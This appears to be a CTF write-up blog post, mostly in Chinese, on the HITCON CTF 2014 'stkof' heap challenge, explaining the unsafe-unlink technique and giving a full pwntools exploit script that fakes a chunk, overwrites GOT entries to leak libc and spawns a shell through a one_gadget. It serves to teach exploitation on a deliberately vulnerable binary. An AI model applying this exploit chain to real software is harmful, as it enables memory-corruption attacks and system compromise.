---
title: hitcon ctf 2014 - stkof
categories:
  - pwn
tags: null
published: true
---

# Introduction

学习 how2heap 中 unsafe unlink 的知识点

- [unsafe unlink](https://github.com/shellphish/how2heap/blob/master/unsafe_unlink.c)

**[stkof](https://github.com/0x3f97/pwn/blob/master/hitcon-ctf-2014-stkof/stkof)**: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4872b087443d1e52ce720d0a4007b1920f18e7b0, stripped

{% highlight bash %}
checksec stkof

    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

{% endhighlight %}

- malloc - 调用 malloc 函数分配用户指定大小的内存，并在 bss 段存储分配的内存地址
- write - 填充任意大小的内存，可以溢出
- free - 调用 free 函数释放一块内存，参数从 bss 段中取
- puts - 输出程序限定的字符串，没什么用的函数

# Leak Libc

根据 unsafe unlink 的原理，分配两块相邻的内存，这里取 chunk2 和 chunk3

```
malloc(0x80)
malloc(0x80)	# chunk2
malloc(0x80)	# chunk3
```

而我们有一个已知位置的全局指针 `0x602140 + 0x10`，存放着 chunk2 的地址，则构造 fake chunk，再释放 chunk3 调用 unlink，实现任意地址写

```
payload = p64(0)
payload += p64(0x8)
payload += p64(0x602140+0x10-0x18)
payload += p64(0x602140+0x10-0x10)
payload += p64(0)*12
payload += p64(0x80)
payload += p64(0x90)
write(2, payload)

free(3)

gdb-peda$ x/16xw 0x602130
0x602130:	0x00000000	0x00000000	0x00000000	0x00000000
0x602140:	0x00000000	0x00000000	0x02c92020	0x00000000
0x602150:	0x00602138	0x00000000	0x00000000	0x00000000
0x602160:	0x00000000	0x00000000	0x00000000	0x00000000
```

接下来可以写 got 表，将 free 的 got 内容改写成 puts 的 plt 地址，则可以任意地址读

```
payload = p64(0)*3
payload += p64(free_got)
payload += p64(atol_got)	# 这里加上 atol_got 是为写 system 做准备
write(2, payload)

payload = p64(puts_plt)
write(2, payload)
```

这时以索引值 3 调用程序的第三个函数，则会将 atol 的 got 值打印出来，由此计算 libc 的基址

# Exploit

之后可以继续写 free 的 got 为 one_gadget 来 get shell，也可以写 system，完整的 exploit 代码：

- [exp.py](https://github.com/0x3f97/pwn/blob/master/hitcon-ctf-2014-stkof/exp.py)

```python
#!/usr/bin/env python

from pwn import *
import sys

context.log_level = "debug"

elf = "./stkof"
ENV = {"LD_PRELOAD":"./libc.so.6"}

p = process(elf)

def malloc(size):
    p.sendline("1")
    p.sendline(str(size))
    p.recvuntil("OK\n")

def write(idx, content):
    p.sendline("2")
    p.sendline(str(idx))
    p.sendline(str(len(content)))
    p.send(content)
    p.recvuntil("OK\n")

def free(idx):
    p.sendline("3")
    p.sendline(str(idx))
    p.recvuntil("OK\n")

def puts(idx):
    p.sendline("4")
    p.send(idx)

pop3_ret = 0x400dbe
pop_rdi_ret = 0x400dc3
pop_rsi_pop_ret = 0x400dc1
pop_rsp_pop3_ret = 0x400dbd

puts_plt = 0x400760
free_got = 0x602018
atol_got = 0x602080

system_off = 0x45390
bin_sh_off = 0x18cd17
one_gadget1 = 0x45216
one_gadget2 = 0x4526a
one_gadget3 = 0xcd0f3
one_gadget4 = 0xcd1c8
one_gadget5 = 0xf0274
one_gadget6 = 0xf0280
one_gadget7 = 0xf1117
one_gadget8 = 0xf66c0


malloc(0x80)
malloc(0x80)    # chunk2
malloc(0x80)    # chunk3

payload = p64(0)
payload += p64(0x8)
payload += p64(0x602140+0x10-0x18)
payload += p64(0x602140+0x10-0x10)
payload += p64(0)*12
payload += p64(0x80)
payload += p64(0x90)
write(2, payload)

free(3)

payload = p64(0)*3
payload += p64(free_got)
payload += p64(atol_got)
#payload += p64(0x602160)
write(2, payload)

payload = p64(puts_plt)
write(2, payload)

#gdb.attach(p)
p.sendline("3")
p.sendline("3")

libc_base = u64(p.recvline().strip().ljust(8, "\x00"))-0x36ea0
log.info("libc_base: "+hex(libc_base))

system_addr = libc_base + system_off
payload = p64(system_addr)

one_gadget = libc_base + one_gadget5
payload = p64(one_gadget)
write(2, payload)

bin_sh_addr = libc_base + bin_sh_off
payload = p64(bin_sh_addr)
#write(4, payload)

#gdb.attach(p)
p.sendline("3")
p.sendline("2")

p.interactive()
```

**Reference**
- [CTF Writeup - HITCON CTF 2014 stkof or the "unexploitable" heap overflow ?](http://acez.re/ctf-writeup-hitcon-ctf-2014-stkof-or-modern-heap-overflow/)